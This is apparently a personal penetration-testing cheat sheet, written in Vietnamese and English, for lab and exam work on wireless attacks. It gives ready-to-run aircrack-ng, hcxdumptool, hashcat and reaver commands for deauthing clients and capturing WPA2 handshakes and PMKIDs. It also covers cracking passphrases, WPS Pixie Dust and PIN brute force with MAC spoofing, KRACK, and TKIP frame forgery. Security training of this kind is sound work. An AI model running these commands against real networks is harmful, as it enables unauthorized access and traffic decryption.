---
title: "Field Manual"
tags: [pentest, wireless, wpa2, field-manual, reference]
created: 2026-04-01
---

> **Mục đích**: Tài liệu tra cứu nhanh trong lab/thi — mỗi lesson thêm một entry.
> **Cách dùng**: Ctrl+F technique name → xem lệnh nhanh, điều kiện, và link về lesson đầy đủ.

---

## Wireless Attacks

#### 4-Way Handshake Capture
- **Condition**: Có client đang kết nối AP, hoặc có thể force deauth
- **Quick command**: `airodump-ng -c <CH> --bssid <BSSID> -w capture wlan0mon`
- **Full flow**: `airmon-ng start wlan0` → `airodump-ng wlan0mon` → `aireplay-ng -0 5 -a <BSSID> -c <CLIENT> wlan0mon` → verify handshake trong airodump
- **Look for**: `WPA handshake: <BSSID>` xuất hiện ở góc trên phải của airodump-ng
- **Ref**: [[03-4way-handshake-capture|03. 4-Way Handshake Capture]]

#### PMKID Clientless Attack
- **Condition**: AP hỗ trợ 802.11r (fast roaming) — không cần client kết nối
- **Quick command**: `hcxdumptool -i wlan0mon -o capture.pcapng --enable_status=3`
- **Full flow**: `hcxdumptool` capture → `hcxpcapngtool capture.pcapng -o hash.hc22000` → `hashcat -m 22000 hash.hc22000 wordlist.txt`
- **Look for**: PMKID lines trong output hcxpcapngtool: `WPA*01*<pmkid>*...`
- **Ref**: [[04-pmkid-clientless-attack|04. PMKID Clientless Attack]]

#### Offline Cracking Pipeline (hashcat -m 22000)
- **Condition**: Có file .hc22000 từ handshake hoặc PMKID capture
- **Quick command**: `hashcat -m 22000 hashes.hc22000 /usr/share/wordlists/rockyou.txt`
- **Full flow**: Convert pcap → `hcxpcapngtool -o hash.hc22000 capture.pcapng` → dictionary → rules → mask → hybrid
- **Look for**: `<SSID>:<password>` trong hashcat output khi crack thành công
- **Ref**: [[05-offline-cracking-pipeline|05. Offline Cracking Pipeline]]

#### WPS Pixie Dust Attack
- **Condition**: AP có WPS enabled, chipset Ralink/Broadcom/Realtek với weak PRNG
- **Quick command**: `reaver -i wlan0mon -b <BSSID> -c <CH> -K -vv`
- **Full flow**: `wash -i wlan0mon` → confirm WPS enabled → `reaver -K` (Pixie Dust) → nhận PIN → `reaver -p <PIN>` lấy PSK
- **Look for**: `[+] WPS pin: XXXXXXXX` trong Reaver output — thường trong vài giây
- **Ref**: [[06-wps-pixie-dust-attack|06. WPS Pixie Dust Attack]]

#### WPS PIN Brute Force
- **Condition**: WPS enabled, không vulnerable Pixie Dust, WPS không bị lock
- **Quick command**: `reaver -i wlan0mon -b <BSSID> -c <CH> -vv -d 1 -r 3:15`
- **Full flow**: `wash` enumerate → Pixie Dust fail → `reaver` online brute force → nếu lock: delay + MAC spoof
- **Look for**: `[+] WPS PIN: XXXXXXXX` và `[+] WPA PSK: 'password'`
- **Ref**: [[07-wps-pin-bruteforce|07. WPS PIN Brute Force]]

#### KRACK — Key Reinstallation Attack
- **Condition**: Client chạy wpa_supplicant chưa patch (Linux/Android pre-2017), attacker có MitM position
- **Quick command**: `python3 krack-test-client.py` (PoC từ krackattacks.com)
- **Full flow**: Clone AP channel lạ → MitM setup → replay Msg3 của 4-way handshake → observe nonce reset → decrypt traffic
- **Look for**: Nonce counter reset về 0 trong EAPOL captures; hoặc AES-CCMP decrypt thành công
- **Ref**: [[08-krack-key-reinstallation|08. KRACK Key Reinstallation]]

#### TKIP MIC Failure Exploitation
- **Condition**: AP/client dùng TKIP (WPA hoặc WPA2-TKIP mixed), sau khi có KRACK nonce reuse
- **Quick command**: Kết hợp với KRACK PoC — target TKIP-encrypted packets
- **Full flow**: KRACK → nonce reuse với TKIP → decrypt packet → extract MIC → recover MIC key bằng Michael algorithm → forge packets
- **Look for**: MIC key recovered → có thể inject frames theo 1 direction
- **Ref**: [[09-tkip-mic-failure|09. TKIP MIC Failure]]

---

## Password & Hash Attacks

*[Tích lũy từ lessons thuộc Phase Password/Hash]*

---

## Tools Reference

*[Tích lũy từ tất cả Type T lessons]*

---

*Field Manual được cập nhật sau mỗi lesson. KHÔNG edit thủ công phần trên — chỉ thêm entries vào các sections.*
